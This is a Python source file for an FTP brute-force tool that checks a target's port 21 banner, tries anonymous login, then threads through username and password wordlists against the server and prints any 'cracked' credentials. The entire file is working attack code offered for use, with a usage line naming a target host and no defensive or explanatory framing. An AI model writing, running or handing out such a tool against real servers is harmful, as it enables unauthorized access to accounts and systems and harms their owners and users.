import socket
import os
from ftplib import FTP
import time
from threading import Thread
import sys

# ''' #

# ''' #
class FtpBrute:
	def __init__(self):
		self.Flag = {"if":True}
		self.configuration = {}
	def cls(self):
		if os.name=="nt":
			os.system("cls")
		else:
			os.system("clear")
	def usage(self):
		print(f"\n{sys.argv[0]} --username /opt/fefe --password /opt/txt.txt --host 192.168.43.2")
		print("--username  -  username file ")
		print("--password  -  password file ")
		print("--host      -  specify the host")
	

	def optionConfigured(self):
		if(len(sys.argv)==7):
			for i in sys.argv:
				if "--" in i:
					Key = i.replace("--","").strip()
					if Key == "host":
						self.configuration[Key] = socket.gethostbyname(sys.argv[sys.argv.index(i)+1])

					else:
						self.configuration[Key] = sys.argv[sys.argv.index(i)+1]
			return True 
		else:
			self.usage()		
			return False

	def isLogin(self,username,passwd):
		server = FTP(self.configuration["host"])
		try:
			server.login(username,passwd)
			print("\n[ + ] username Cracked : ",username)
			print("\n [ + ] Password Cracked: ",passwd)
			self.Flag["if"] = False
		except:
			pass

	def isPortOpen(self):
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		host = self.configuration["host"]
	#host = host
		port = 21
		try:
			s.connect((host,port))
			print("[ + ] Banner  Found :",s.recv(1024).decode())
			return True
		except:
			print("[ - ] Target Port Closed Or FireWall Block ")
			return False

	def is_login_Anonymous(self):
		server = FTP(self.configuration["host"])
		try:
			server.login("anonymous","anonymous")
			return True
		except:
			print("[ - ] Anonymous Access Denied [ ! ]")
			return False
	def Main_Code(self):
		if self.optionConfigured():
			self.cls()
			if self.isPortOpen():
				
				print("="*40)
				print("\n [ + ] Host Locked :",self.configuration["host"])
				print("\n [ + ] UserFile Locked :",self.configuration["username"])
				print("\n [ + ] PasswordFile Locked:",self.configuration["password"])
				print("="*40)
				if self.is_login_Anonymous():
					print(" [+] Anonymous Access Successfull")
				else:
					with open(self.configuration["username"],'r') as File:
						username = File.read().strip().splitlines()
						File.close()
					with open(self.configuration["password"],'r') as File:
						password = File.read().strip().splitlines()
						File.close()
					for user in username:
						for passwd in password:
							time.sleep(0.5)
							if self.Flag["if"] == True:
								print(f" [ * ] Trying {user} : {passwd}")
								t = Thread(target=self.isLogin,args=(user,passwd))
								t.start()
							else:
								print("\n[ ! ] Exiting Script !")
								break
c = FtpBrute()
c.Main_Code()